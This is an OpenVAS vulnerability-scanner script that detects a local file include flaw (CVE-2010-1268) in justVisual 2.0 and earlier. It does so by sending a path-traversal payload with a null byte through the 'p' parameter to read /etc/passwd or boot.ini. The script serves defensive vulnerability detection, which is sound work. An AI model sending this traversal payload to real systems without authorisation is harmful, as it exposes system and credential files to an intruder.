###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_justVisual_38970.nasl 14 2013-10-27 12:33:37Z jan $
#
# justVisual 'p' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "justVisual is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the underlying computer; other attacks
are also possible.

justVisual 2.0 and prior are vulnerable.";


if (description)
{
 script_id(100555);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-03-26 13:01:50 +0100 (Fri, 26 Mar 2010)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2010-1268");
 script_bugtraq_id(38970);

 script_name("justVisual 'p' Parameter Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38970");
 script_xref(name : "URL" , value : "http://fh54.de/2009/09/justvisual2/");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if justVisual is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/jv/www","/www",cgi_dirs());
files = make_list("/etc/passwd","boot.ini");

foreach dir (dirs) {
  foreach file (files) {
   
    url = string(dir, "/index.php?p=../../../../../../../../../../",file,"%00"); 
  
    if(http_vuln_check(port:port, url:url,pattern:"(root:.*:0:[01]:|\[boot loader\])")) {
     
      security_hole(port:port);
      exit(0);

    }
  }

}  
exit(0);
